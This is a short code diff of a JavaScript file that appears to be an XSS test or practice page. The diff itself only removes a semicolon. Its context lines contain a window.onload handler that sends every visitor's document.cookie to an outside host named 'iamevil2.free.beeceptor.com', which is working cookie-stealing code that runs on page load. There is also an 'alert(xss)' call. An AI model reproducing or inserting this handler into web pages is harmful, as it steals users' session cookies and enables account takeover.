@@ -7,7 +7,7 @@ function getRandomInt(max) {
 
 window.onload = (event) => {
     window.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
-};
+}
 
 color.onclick = () => {
     alert(xss);
